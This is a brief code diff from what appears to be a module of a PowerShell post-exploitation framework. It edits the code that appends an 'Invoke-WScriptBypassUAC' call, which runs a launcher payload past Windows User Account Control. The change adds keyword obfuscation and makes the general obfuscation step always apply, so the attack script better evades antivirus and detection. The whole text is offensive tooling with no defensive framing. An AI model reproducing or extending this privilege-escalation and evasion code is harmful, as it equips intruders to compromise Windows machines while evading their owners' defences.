@@ -118,7 +118,8 @@ class Module(object):
                 return ""
             else:
                 scriptEnd = "Invoke-WScriptBypassUAC -payload \"%s\"" % (launcher)
-                if obfuscate:
-                    scriptEnd = helpers.obfuscate(self.mainMenu.installPath, psScript=scriptEnd, obfuscationCommand=obfuscationCommand)
-                script += scriptEnd
-                return script
+                scriptEnd = helpers.keyword_obfuscation(scriptEnd, self.mainMenu)
+        if obfuscate:
+            scriptEnd = helpers.obfuscate(self.mainMenu.installPath, psScript=scriptEnd, obfuscationCommand=obfuscationCommand)
+        script += scriptEnd
+        return script
